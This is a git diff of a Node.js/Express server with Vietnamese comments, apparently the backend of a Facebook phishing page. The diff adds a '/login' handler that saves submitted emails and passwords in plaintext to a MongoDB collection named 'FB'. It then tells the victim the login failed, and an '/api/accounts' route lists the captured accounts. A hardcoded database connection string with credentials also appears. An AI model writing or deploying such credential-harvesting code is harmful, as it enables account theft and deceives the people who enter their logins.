@@ -2,6 +2,7 @@ const express = require('express')
 const app = express()
 const port = 5000
 const router = express.Router();
+const cors = require('cors');
 // Import thư viện mongoose
 const mongoose = require('mongoose');
 const bodyParser = require('body-parser');
@@ -9,9 +10,8 @@ const webRouter = require('./src/routes/web')
 const configviewengine = require('./src/config/viewengine');
 app.use(express.json())
 app.use(bodyParser.json());
-const cors = require('cors');
-app.use(cors());
-
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
 configviewengine(app);
 app.use('/api/admin', webRouter);
 app.use('/', webRouter);
@@ -21,7 +21,7 @@ app.use('/api/admin/users', webRouter);
 app.set('view engine', 'ejs');
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
-
+app.use(cors());
 // URL kết nối đến MongoDB Atlas
 const dbURI = 'mongodb+srv://demo:123@cluster0.qdwwh.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
 
@@ -48,12 +48,19 @@ const FB = mongoose.model('FB', fbSchema);
 // Route để xử lý dữ liệu từ form
 app.post('/login', async (req, res) => {
     try {
+        // Lấy dữ liệu từ form
         const { email, password } = req.body;
 
+        // Tạo một document mới
         const newFB = new FB({ email, password });
 
+        // Lưu document vào MongoDB
         await newFB.save();
 
+        res.status(201).json({ message: "Đăng Nhập Thất Bại!" });
+    } catch (error) {
+        console.error(error);
+        res.status(500).send('An error occurred while saving the FB account.');
     }
 });
 // Route để lấy dữ liệu từ MongoDB và hiển thị lên trang web
@@ -68,7 +75,7 @@ app.get("/api/accounts", async (req, res) => {
     }
 });
 
-app.use(cors());
+
 
 app.listen(port, () => {
     console.log(`Example app listening on port ${port}`)
